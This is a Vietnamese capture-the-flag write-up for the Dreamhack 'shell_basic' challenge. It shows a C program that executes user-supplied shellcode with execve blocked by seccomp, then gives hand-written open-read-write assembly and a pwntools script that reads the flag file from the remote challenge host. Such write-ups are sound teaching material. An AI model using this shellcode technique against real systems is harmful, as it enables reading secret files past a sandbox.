```sh
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```
* Ở bài này chương trình muốn ta phải sử dụng kỹ thuật `OWR shellcode` để khai thác
* Analysis : 
 ```sh
   int fd = open(“/home/shell_basic/flag_name_is_loooooong”, O_RDONLY, NULL);
   read(fd, buf, 0x30);
   write(1, buf, 0x30);
  ```
* exploit
  ```sh
  push 0x0                    ;  NULL byte
  mov rax, 0x676e6f6f6f6f6f6f ; "oooooong"
  push rax
  mov rax, 0x6c5f73695f656d61 ; "ame_is_l"
  push rax
  mov rax, 0x6e5f67616c662f63 ; "c/flag_n"
  push rax
  mov rax, 0x697361625f6c6c65 ; "ell_basi"
  push rax
  mov rax, 0x68732f656d6f682f ; "/home/sh"
  push rax
  mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
  xor rsi, rsi    ; rsi = 0 ; RD_ONLY
  xor rdx, rdx    ; rdx = 0
  mov rax, 2      ; rax = 2 ; syscall_open
  syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

  mov rdi, rax      ; rdi = fd
  mov rsi, rsp
  sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
  mov rdx, 0x30     ; rdx = 0x30     ; len
  mov rax, 0x0      ; rax = 0        ; syscall_read
  syscall           ; read(fd, buf, 0x30)

  mov rdi, 1        ; rdi = 1 ; fd = stdout
  mov rax, 0x1      ; rax = 1 ; syscall_write
  syscall           ; write(fd, buf, 0x30)
  ```

* ```sh
  from pwn import *

  # p = process("./shell_basic")
  p = remote("host3.dreamhack.games", 15969)
  context.arch = "amd64"

  dir = "/home/shell_basic/flag_name_is_loooooong"

  shellcode = shellcraft.open(dir)
  shellcode += shellcraft.read('rax', 'rsp', 0x30)
  shellcode += shellcraft.write(1, 'rsp', 0x30)

  p.sendlineafter(b"shellcode: ", asm(shellcode))

  p.interactive()
  ```
